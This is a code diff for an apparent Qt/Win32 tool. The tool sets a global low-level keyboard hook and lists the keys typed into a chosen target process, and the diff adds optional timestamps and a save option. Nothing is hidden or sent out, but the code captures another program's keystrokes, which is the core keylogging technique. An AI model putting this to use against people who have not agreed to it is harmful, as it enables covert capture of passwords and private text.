@@ -42,6 +42,8 @@ LRESULT CALLBACK process::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     QListWidget *lwi = static_cast<QListWidget *>(lw_info);
     QCheckBox *cbt = static_cast<QCheckBox *>(cb_time);
     QCheckBox *cbs = static_cast<QCheckBox *>(cb_save);
+    
+    time_t rawtime;
 
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         DWORD foregroundPID;
@@ -53,7 +55,19 @@ LRESULT CALLBACK process::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
             if (lwi)
             {
-                lwi->addItem(QString(static_cast<char>(key)));
+                QString qstr(static_cast<char>(key));
+
+                if (cbt && cbt->isChecked())
+                {
+                    time(&rawtime);
+                    qstr.append(" ").append(ctime(&rawtime));
+                    lwi->addItem(qstr);
+                }
+                else
+                {
+                    lwi->addItem(qstr);
+                }
+
                 lwi->scrollToBottom();
             }
         }
@@ -62,10 +76,13 @@ LRESULT CALLBACK process::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 
-void process::SetHook(DWORD pid, void *lwi)
+void process::SetHook(DWORD pid, void *lwi, void *cbt, void *cbs)
 {
     targetPID = pid;
     lw_info = lwi;
+    cb_time = cbt;
+    cb_save = cbs;
+
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(nullptr), 0);
 }
 
